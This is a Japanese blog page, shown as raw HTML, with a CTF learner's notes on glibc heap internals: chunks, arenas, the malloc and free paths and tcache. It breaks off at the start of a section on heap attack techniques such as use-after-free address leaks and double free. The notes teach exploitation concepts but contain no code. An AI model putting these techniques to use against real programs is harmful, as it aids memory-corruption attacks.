<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">よちよちCTFerがHeap完全に理解したになるまでのメモ - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="とりあえずglibcのmalloc関数について学んでいくことにします。"/><meta data-react-helmet="true" property="og:site_name" content="よちよちCTFerがHeap完全に理解したになるまでのメモ - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/e4fb140badf74c73bc7e4cdf320dbaf5/ctf-learning-heap.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="よちよちCTFerがHeap完全に理解したになるまでのメモ - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="とりあえずglibcのmalloc関数について学んでいくことにします。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/e4fb140badf74c73bc7e4cdf320dbaf5/ctf-learning-heap.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-8d3bc24fd199c93e925d.js"/><link as="script" rel="preload" href="/app-a5613c1b5d673099e15a.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-learning-heap/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">よちよちCTFerがHeap完全に理解したになるまでのメモ</h1><div class="Content-module--content__body--2TrQ-"><p>どうやら一口にHeapと言っても色々あるようですが、とりあえずglibcのmalloc関数について学んでいくことにします。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li><a href="#%E8%A6%81%E7%82%B9%E3%83%A1%E3%83%A2ctf%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AEheap">要点メモ：CTFのためのHeap</a></li>
<li><a href="#malloc%E3%81%A7heap%E3%82%92%E7%A2%BA%E4%BF%9D%E3%81%99%E3%82%8B__libc_malloc">malloc()でHeapを確保する(_<em>libc</em>malloc)</a></li>
<li><a href="#free%E3%81%A7heap%E3%82%92%E8%A7%A3%E6%94%BE%E3%81%99%E3%82%8B">free()でHeapを解放する</a></li>
<li><a href="#heap%E3%81%AE%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95">Heapの攻撃手法</a></li>
<li><a href="#glibc%E3%81%AE%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%89%8B%E3%81%AB%E5%85%A5%E3%82%8C%E3%82%8B">glibcのソースコードを手に入れる</a></li>
<li>
<p><a href="#%E3%83%81%E3%83%A3%E3%83%B3%E3%82%AF">チャンク</a></p>
<ul>
<li><a href="#allocated-chunk">Allocated chunk</a></li>
<li><a href="#free-chunk">Free chunk</a></li>
</ul>
</li>
<li><a href="#%E3%82%A2%E3%83%AA%E3%83%BC%E3%83%8A">アリーナ</a></li>
<li><a href="#fastbin">fastbin</a></li>
<li><a href="#unsortedbin">unsortedbin</a></li>
<li><a href="#smallbin">smallbin</a></li>
<li><a href="#largebin">largebin</a></li>
<li><a href="#tcache">tcache</a></li>
<li>
<p><a href="#heap-exploit%E6%BC%94%E7%BF%92">Heap Exploit演習</a></p>
<ul>
<li><a href="#picoctf--cache-me-outside">picoCTF:  Cache Me Outside</a></li>
</ul>
</li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E6%83%85%E5%A0%B1">参考情報</a></li>
</ul>
<h2 id="要点メモctfのためのheap" style="position:relative;"><a href="#%E8%A6%81%E7%82%B9%E3%83%A1%E3%83%A2ctf%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AEheap" aria-label="要点メモctfのためのheap permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>要点メモ：CTFのためのHeap</h2>
<ul>
<li>Heapの用途は、要求に応じた適切なサイズのメモリ領域を永続的に確保すること</li>
<li>Heapの割り当て、解法を行う機構は「アロケータ」と呼ばれる</li>
<li>
<p>Heapのメモリプールは「アリーナ」と呼ばれる機構で管理される</p>
<ul>
<li>スレッドが複数存在する場合、スレッドごとに「スレッドアリーナ」が用意される</li>
</ul>
</li>
<li>Heapの割り当てはブレーク値を増加させて上位に引き上げることで行われる</li>
<li>
<p>Heapは「チャンク」というブロック単位で管理され、x86_64の場合は0x10バイトごとにアラインメントされる</p>
<ul>
<li>チャンクの最小サイズは<code class="language-text">MINSIZE</code>として0x20バイトが定義されている</li>
</ul>
</li>
<li>
<p>解放済みのチャンクは双方向連結リストとして保持される</p>
<ul>
<li>小さいチャンクを単方向リストで管理する機構もある</li>
</ul>
</li>
<li>Heapに関してユーザが調整可能なパラメータは、プロセスに1つ<code class="language-text">malloc_par</code>として管理される</li>
</ul>
<h2 id="mallocでheapを確保する_libcmalloc" style="position:relative;"><a href="#malloc%E3%81%A7heap%E3%82%92%E7%A2%BA%E4%BF%9D%E3%81%99%E3%82%8B_libcmalloc" aria-label="mallocでheapを確保する_libcmalloc permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>malloc()でHeapを確保する(_<em>libc</em>malloc)</h2>
<p>※ <a href="https://amzn.to/3AEtVa7" target="_blank" rel="nofollow noopener noreferrer">詳解セキュリティコンテスト</a>のP.572からの内容が非常に充実しているので、詳しくはこちらを参照。</p>
<ol>
<li>_<em>libc</em>malloc()関数に与えられた要求サイズから適切なチャンクのサイズを決定する(要求サイズ+0x8バイトを0x10でアラインメント)</li>
<li>要求サイズに応じてtcache(0x410バイト以下)→binsの順にチャンク確保を試みる</li>
<li>チャンクの確保先によって、<code class="language-text">_int_malloc()</code>か<code class="language-text">tcache_get()</code>が使用される</li>
</ol>
<p><code class="language-text">_int_malloc()</code>が選択された場合は、以下の記事に記載されているように要求サイズによって処理が分岐していきます。</p>
<p>参考：<a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/core_functions#void-_int_malloc-mstate-av-size_t-bytes" target="_blank" rel="nofollow noopener noreferrer">Core Functions - heap-exploitation</a></p>
<p><code class="language-text">_int_malloc()</code>の動きについては<a href="https://amzn.to/3AEtVa7" target="_blank" rel="nofollow noopener noreferrer">詳解セキュリティコンテスト</a>のP.574に記載のUMLを参照します。</p>
<p>※ 巨大な領域(0x200000バイト以上)を割り当てようとした場合、Heapの確保はmmap()によって行われます。</p>
<h2 id="freeでheapを解放する" style="position:relative;"><a href="#free%E3%81%A7heap%E3%82%92%E8%A7%A3%E6%94%BE%E3%81%99%E3%82%8B" aria-label="freeでheapを解放する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>free()でHeapを解放する</h2>
<ol>
<li><code class="language-text">__libc_free()</code>関数が呼び出され、解放するチャンクがmmap()で確保されたものかどうかを検証する</li>
<li>この結果に応じて、<code class="language-text">munmap_chunk()</code>または<code class="language-text">_int_free()</code>のどちらかが解放に使用される</li>
<li><code class="language-text">_int_free()</code>が使用される場合、対象のサイズやエントリ数をもとにチャンクの繋ぎ先をtcache、fastbin、またはそれ以外にするかを決定する</li>
</ol>
<p>※ より詳細な挙動は<a href="https://amzn.to/3AEtVa7" target="_blank" rel="nofollow noopener noreferrer">詳解セキュリティコンテスト</a>を参照</p>
<h2 id="heapの攻撃手法" style="position:relative;"><a href="#heap%E3%81%AE%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95" aria-label="heapの攻撃手法 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Heapの攻撃手法</h2>
<p>参考：<a href="https://github.com/shellphish/how2heap" target="_blank" rel="nofollow noopener noreferrer">how2heap: A repository for learning various heap exploitation techniques.</a></p>
<ul>
<li>アドレスのリーク
アドレスのリークのためには、Use After Free攻撃や未初期化のバグが利用できるようです。</li>
<li>Double Free(二重解放)
